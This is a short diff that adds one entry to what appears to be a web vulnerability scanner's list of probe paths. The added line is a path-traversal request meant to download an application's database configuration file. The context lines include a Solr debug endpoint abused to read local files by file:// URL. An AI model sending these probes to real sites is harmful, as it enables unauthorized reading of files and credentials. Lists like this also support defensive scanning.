@@ -97,3 +97,4 @@
 /solr/solrdefault/debug/dump?param=ContentStreams&stream.url=file://{{path}}
 /royal_event/btndates_report.php#?=
 /index.php?rest_route=/whm/v3/themesettings
+/index/download/index?name=index.php&url=../../application/database.php
